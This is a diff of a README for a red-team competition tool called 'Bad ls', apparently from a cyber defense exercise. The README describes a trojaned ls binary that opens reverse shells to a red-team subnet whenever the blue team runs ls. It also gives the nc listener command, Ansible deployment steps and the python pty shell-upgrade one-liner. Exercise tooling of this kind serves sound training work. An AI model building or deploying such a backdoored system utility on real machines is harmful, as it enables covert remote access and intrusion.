@@ -1,5 +1,22 @@
 # CDT 2025 Red Team tool
 ## Bad ls
+Red team tool that will give the entire 10.0.20.0/24 red team subnet a reverse shell if the red team box is listening on the correct port
+
+Reverse shells will be initiated on every blue team execution of the "ls" command
+
+The port number the reverse shell will connect to will be
+```py
+(10000,20000,30000 depending on blue team number + last octet of target ip address)
+```
+So, for example, we want to connect to 10.0.3.5, the port number will be `30005`
+
+## Starting listener
+Port number is subject to change
+```bash
+nc -nvlp 30005
+```
+
+## Building and deploying
 
 Note: build executable on debian bookworm instance
 
@@ -18,10 +35,9 @@ Build python script into linux binary
 ./convert_to_linux_binary.sh
 ```
 
-## Starting listener
-Port number is subject to change
+Configure `ansible/inventory.ini` to match target(s), then deploy
 ```bash
-nc -nvlp 4444
+ansible-playbook deploy_tools.yml
 ```
 
 ## Upgrading reverse shell to fully interactive tty
@@ -33,7 +49,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # TODO
 Make "all-in-one" deploy script that will build and then deploy to box
-Make reverse shell connect to every red team host instead of just one host
+Create tmux listeners for every possible IP in scope
 
 > Author: Daniel Wolosiuk
 
